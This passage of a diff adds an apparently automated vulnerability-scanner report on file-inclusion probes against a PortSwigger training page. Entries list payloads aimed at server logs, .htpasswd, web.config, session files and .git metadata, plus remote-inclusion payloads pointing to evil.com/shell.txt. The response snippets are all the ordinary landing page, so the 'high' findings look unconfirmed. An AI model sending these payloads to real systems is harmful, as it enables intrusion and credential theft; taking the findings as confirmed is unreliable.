+        <p><em>Detected at: 2025-09-14 21:42:17</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>34. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/var/log/apache2/access.log" target="_blank">https://portswigger.net/web-security?page=/var/log/apache2/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/apache2/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:18</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>35. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/var/log/apache/access.log" target="_blank">https://portswigger.net/web-security?page=/var/log/apache/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Alternative Apache access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/apache/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:20</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>36. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/var/log/nginx/access.log" target="_blank">https://portswigger.net/web-security?page=/var/log/nginx/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Nginx access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/nginx/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:22</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>37. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/.htaccess" target="_blank">https://portswigger.net/web-security?page=/.htaccess</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache configuration in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.htaccess</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:23</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>38. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/.htpasswd" target="_blank">https://portswigger.net/web-security?page=/.htpasswd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.htpasswd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:24</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>39. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/web.config" target="_blank">https://portswigger.net/web-security?page=/web.config</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - IIS configuration in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/web.config</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:25</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>40. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/var/lib/php/sess_%5BSESSION_ID%5D" target="_blank">https://portswigger.net/web-security?page=/var/lib/php/sess_%5BSESSION_ID%5D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP session file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/lib/php/sess_[SESSION_ID]</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:26</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>41. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/tmp/sess_%5BSESSION_ID%5D" target="_blank">https://portswigger.net/web-security?page=/tmp/sess_%5BSESSION_ID%5D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Alternative PHP session file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/tmp/sess_[SESSION_ID]</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:28</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>42. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/index.php.bak" target="_blank">https://portswigger.net/web-security?page=/index.php.bak</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Backup file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/index.php.bak</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:29</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>43. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/index.php~" target="_blank">https://portswigger.net/web-security?page=/index.php~</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Temporary backup file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/index.php~</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:30</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>44. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=/.git/HEAD" target="_blank">https://portswigger.net/web-security?page=/.git/HEAD</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Git metadata in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.git/HEAD</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:31</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>45. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=http%3A//evil.com/shell.txt" target="_blank">https://portswigger.net/web-security?page=http%3A//evil.com/shell.txt</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Remote file inclusion test in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>http://evil.com/shell.txt</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:33</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>46. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="https://portswigger.net/web-security?page=http%3A//evil.com/shell.txt%5C0" target="_blank">https://portswigger.net/web-security?page=http%3A//evil.com/shell.txt%5C0</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - RFI with null byte in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>http://evil.com/shell.txt\0</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>Web Security Academy: Free Online Training from PortSwigger</title>
+    <meta name="description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Web Security Academy: Free Online Training from PortSwigger">
+    <meta name="twitter:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta name="twitter:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Web Security Academy: Free Online Training from PortSwigger"/>
+    <meta property="og:description" content="The Web Security Academy is a free online training center for web application security, brought to you by PortSwigger. Create an account to get started.">
+<meta property="og:url" content="https://portswigger.net"/>
+<meta property="og:image" content="https://portswigger.net/content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="https://portswigger.net/web-security"/>
+<link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="/content/images/logos/apple-touch-icon.png">
+    <link href="/content/pslandingpages.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="/content/fonts/ps-icons-small/ps-icons-small.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="</pre>
+        <p><em>Detected at: 2025-09-14 21:42:34</em></p>
+    </div>
+
+    <footer style="margin-top: 40px; padding: 20px 0; border-top: 1px solid #eee; font-size: 0.9em; color: #777;">
+        <p>Report generated by Advanced Vulnerability Scanner</p>
+        <p>Note: This is an automated report. Please verify all findings before taking action.</p>
+    </footer>
+</body>
+</html>
